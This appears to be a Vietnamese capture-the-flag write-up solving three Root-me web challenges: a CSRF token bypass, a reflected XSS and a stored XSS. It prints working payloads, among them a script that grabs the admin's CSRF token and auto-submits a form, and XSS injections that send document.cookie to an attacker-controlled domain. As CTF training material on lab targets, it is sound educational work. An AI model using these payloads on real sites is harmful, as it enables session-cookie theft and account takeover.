# Root-me
``capy3ra``

## CSRF – token bypass

1. Để lấy được flag trong action=private thì tài khoản của attacker phải được admin approved bằng cách tick checkbox ở action=profile.
2. Vector tấn công ở đây sẽ là action=contact khi mà gửi comment thì admin sẽ đọc comment. Và ta sẽ poisoning input đó.
3. Tuy nhiên ở đây, server triển khai csrf token. Do đó trước hết phải lấy được token của admin ở action=profile. Chúng ta có thể lấy được token đó bằng cách gửi một request đến action=profile với admin session khi mà ta lừa admin đọc comment mà ta gửi kèm với payload. 
```
var request = new XMLHttpRequest();
request.open("GET", decodeURIComponent("http://challenge01.root-me.org/web-client/ch23/?action=profile"), false);
request.send(null); 
var respone = request.responseText; 
var groups = respone.match("token\" value=\"(.*?)\""); 
var token = groups[1];
```

4. Sau đó tạo một form có checkbox có giá trị "on" với username account của attacker được tự động gửi. Dẫn đến account của attacker có thể được admin approved.
5. Toàn bộ Payload:
```
<form name="csrf" method="POST" action="http://challenge01.root-me.org/web-client/ch23/index.php?action=profile" enctype="multipart/form-data">
	<input id="username" type="text" name="username" value="cuong">
	<input id="status" type="checkbox" name="status" checked value="on">
	<input id="token" type="hidden" name="token" value= />
</form>

<script>
 	var request = new XMLHttpRequest();
 	request.open("GET", decodeURIComponent("http://challenge01.root-me.org/web-client/ch23/?action=profile"), false);
 	request.send(null); 
 	var respone = request.responseText; 
 	var groups = respone.match("token\" value=\"(.*?)\""); 
 	var token = groups[1];
	document.getElementById("token").value = token;
    document.csrf.submit();

</script>
```
6. Vào action=private lấy flag.
![image](https://github.com/cuong9cm/CTFwriteup/assets/80744099/b6eb6b27-cf83-4790-9ac6-c4e93463e4ac)

## XSS - Reflected

1. Ở đây khi view source của trang home nhận thấy một comment trỏ đến một endpoint khả nghi
``<!--li><a href="?p=security">Security</a></li-->``
2. Khi truy cập đến endpoint đó, trang trả về trang not found nhưng có một tính năng có khả năng thực thi xss đó là `report to the adminitrator` nó sẽ gửi url hiện tại cho admin.
![image](https://github.com/cuong9cm/CTFwriteup/assets/80744099/7c494b7f-f1cf-49fa-b604-d85729af6a51)
3. Khi thử chèn xss payload `<script>alert(1)</script> vào param p thì nhận thấy nó vẫn nằm trong thuộc tính href và bị escapse.
![image](https://github.com/cuong9cm/CTFwriteup/assets/80744099/3cc8c278-2390-4402-91be-42088bbce90c)
4. Thử inject để escapse thuộc tính href bằng payload `test' onmousemove='alert(document.cookie)` thì nhận thấy thành công.
![image](https://github.com/cuong9cm/CTFwriteup/assets/80744099/3f2b372a-201b-496f-ad39-3c4b08d983f1)
5. Craft payload để sau khi report url cho admin mà admin thực hiện một event xác định đó thì sẽ redirect tới trang mà attacker có thể kiểm soát. Payload:
``test' onmousemove='document.location="http://oceanmancuonh.site?cmd=".concat(document.cookie)``
6. Vào access_log của server để có thể lấy được cookie có chứa flag.
![image](https://github.com/cuong9cm/CTFwriteup/assets/80744099/74394933-97c5-48f9-add3-1ef5c9f3488e)

## XSS - Stored 2

1. Ở bài này nhận thấy rằng input truyền vào ở title và message đều bị filter không thể inject xss được.
2. Tuy nhiên nhận thấy khi thay đổi giá trị cookie status thì nó cũng reflect lại ở phần Posted messages.
![image](https://github.com/cuong9cm/CTFwriteup/assets/80744099/36fee880-5d29-41aa-b5af-ecee91de1c54)
3. Inject thử xss vào với payload `"><script>alert(1)</script>` thì thấy thành công.
![image](https://github.com/cuong9cm/CTFwriteup/assets/80744099/06fbd079-8e1e-471b-94ca-09e2653253ab)
4. Được biết sau khi gửi message thì admin sẽ đọc và dựa vào tiêu đề chal -> ta sẽ thực  hiện stored xss với payload sau để lấy cookie của admin.
``"><script>document.location='http://oceanmancuonh.site?c='+document.cookie</script>``
5. Vào access_log thì nhận thấy chúng ta có được admincoookie.
![image](https://github.com/cuong9cm/CTFwriteup/assets/80744099/f30cfa35-49b8-4c86-b50f-50495d8cda27)
6. Thêm admincookie rồi vào endpoint session=admin thì nhận được flag.
![image](https://github.com/cuong9cm/CTFwriteup/assets/80744099/a0bee487-2455-4b01-911f-5f2a91328bf3)

## 
